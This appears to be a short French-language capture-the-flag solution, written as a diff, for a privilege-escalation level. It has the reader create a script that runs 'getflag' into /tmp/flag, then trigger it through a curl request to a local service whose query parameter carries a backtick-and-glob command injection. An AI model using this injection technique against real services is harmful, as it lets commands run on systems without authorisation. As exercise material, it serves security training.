@@ -1,0 +1,9 @@
+creer un fichier nommer FILE tel que file soit:
+#!/bin/bash
+
+getflag > /tmp/flag
+
+
+
+lancer la commande curl 'localhost:4646?x="`/*/FILE`"'
+et recuperer le token dans /tmp/flag
